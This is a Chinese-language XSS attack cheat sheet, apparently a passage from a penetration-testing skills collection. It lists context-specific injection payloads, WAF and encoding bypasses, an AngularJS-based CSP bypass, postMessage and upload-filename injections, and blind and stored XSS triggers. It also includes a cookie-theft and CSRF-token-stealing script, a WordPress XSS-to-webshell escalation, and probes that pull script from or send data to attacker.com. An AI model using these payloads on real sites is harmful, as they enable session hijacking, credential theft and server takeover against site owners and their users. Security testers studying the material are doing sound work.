...
> 融合自 yaklang/hack-skills `xss-cross-site-scripting`，与上文去重后仅保留独有内容。CSP 的 JSONP/base/悬挂标记绕过见上文「CSP 绕过进阶」；标签/事件/编码基础绕过见上文「XSS WAF/过滤绕过」。

## 上下文注入矩阵（选 payload 前先定上下文）

| 上下文 | 特征 | 起手 | Payload |
|---|---|---|---|
| HTML 标签外 | `<b>INJECT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| 属性值 | `value="INJECT"` | 闭合引号 | `"onmouseover=alert(1)//` |
| 属性内无法闭合标签 | 引号内 `>` 被剥 | 事件注入 | `"autofocus onfocus=alert(1)//` |
| 块级标签（title/script/textarea） | `<title>INJECT</title>` | 先闭合标签 | `</title><svg onload=alert(1)>` |
| href/src/data/action | 链接或表单 | 协议 | `javascript:alert(1)` |
| JS 单引号字符串 | `var x='INJECT'` | 破坏字符串 | `'-alert(1)-'` / `'-alert(1)//` |
| JS 字符串带转义 | 反斜杠转义 | 双重转义 | `\'-alert(1)//` |
| JS 逻辑块 | if/函数体内 | 闭合+注入 | `'}alert(1);{'` |
| 页面任意 `<script>` | `<script>...INJECT` | 破坏脚本 | `</script><svg onload=alert(1)>` |
| XML 页面（text/xml） | XML content-type | 命名空间 | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

## 多次反射攻击（Multi-Reflection）

同一输入在页面多处反射时，一个 payload 从多个点触发：
...
**DOM 插入注入**（反射在 DOM 而非源码：`.innerHTML` / `document.write` / jQuery `.html()`）：
...
**PHP_SELF 路径注入**（URL 本身被反射进 form action）：
...
```
文件名反射："><svg onload=alert(1)>.gif
SVG 上传：<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
EXIF 元数据反射：exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

**postMessage XSS**（页面监听 message 不校验 origin）：

```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

origin 用 `.includes()` / 前缀匹配时可子域绕过：`http://facebook.com.ATTACKER.com/...`。

**无闭合标签的 script 注入**（页面后部存在 `</script>`）：
...
## CSP 绕过补充（Angular 专属；JSONP/base/悬挂标记见上文）

```html
<!-- 白名单含 ajax.googleapis.com 时：AngularJS CDN 绕过 -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

服务端转义 HTML 但页面有 AngularJS 模板时（`{{1+1}}` 渲染成 `2` = CSTI 指标）：
...
**参数名攻击**（WAF 只查值不查名，参数名被反射进 JSON 输出）：

```
?"></script><base%20c%3D=href%3Dhttps:\mysite>    ← payload 在参数名里
```

**编码链**：`%253C`（双编码 `<`）、`%26lt;`（实体双编码）、`<%00h2`（null 字节）、`%0d%0a`（标签内 CRLF）。顺序：反射 → 编码行为 → 推断过滤逻辑 → 变异。

**标签变异**：`</script/x>`（尾部垃圾）、`<script`（不完整，依赖后续 `>`）、`<svg/onload=`（斜杠代空格）。

**碎片化注入**（strip-tags 类过滤）：
...
**二次注入**：输入被存储（常被规范化/HTML 编码），之后**取出**插入 DOM 时未再编码。触发 payload：

```
&lt;svg/onload&equals;alert(1)&gt;
```

排查：个人资料、显示名、论坛帖 —— 存储后在不同上下文重渲染处（管理后台 vs 用户页面）。存储型 → 管理员上下文 XSS 影响最大。

**盲注 XSS**：所有不立即回显的参数都要测 —— 联系表单、反馈字段、UA/Referer、注册字段、错误日志注入。
...
```javascript
// Cookie 窃取（HttpOnly cookie 偷不到 → 转 CSRF 或会话固定）
...
// 借 XSS 过 CSRF 防护（读 DOM 里的 CSRF token）
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false); r.send();
...
WordPress XSS → RCE（管理员会话 + `plugin-editor.php` 写 PHP webshell：`_wpnonce` + `newcontent` 组合 POST，再触发 hello.php）。更多后渗透扩展见 [xss-advanced-xss-tricks.md](./xss-advanced-xss-tricks.md)。
...
测试 XSS 入口
├── 输入反射在响应里？
│   ├── 是 → 定上下文（HTML/JS/属性/URL）→ 选上下文 payload
│   │        → 被挡 → 查过滤行为 → 编码/大小写/碎片化
│   │        → 查参数名是否反射（WAF 盲区）
│   │        → 成功 → 提权（cookie/CSRF/RCE）
│   └── 否 → 存储？→ 盲注 XSS payload
│            在 DOM？→ 查 JS 源不安全 sink
│                     (innerHTML / eval / document.write / location.href)
└── 有 CSP？
    ├── 白名单域的 JSONP 端点
    ├── CDN 白名单上的 AngularJS
    ├── base-uri 缺失 → <base> 注入
    └── unsafe-eval / unsafe-inline 例外
```

## 测试流程（Zseano 法）

1. 测无害标签：`<h2>`、`<img>`、`<table>` 是否原样反射
2. 测不完整标签：`<iframe src=//attacker.com/c=`（无闭合 `>`）
3. 编码探测：`<%00h2`、`%0d`、`%0a`、`%09`、`%253C`
4. 若过滤 `<script>` 和 `onerror` 但不拦截 `<script `（无闭合）：`<script src=//attacker.com?c=`
5. 黑名单检查：`<svg>` 行？`<ScRiPt>` 行？
6. **同一过滤大概率全站存在** —— 搜索处过滤了 `<script>`，上传文件名/个人简介处呢？过滤器存在 = 开发者试图修补 = 漏洞线索，顺藤摸瓜扫全站。
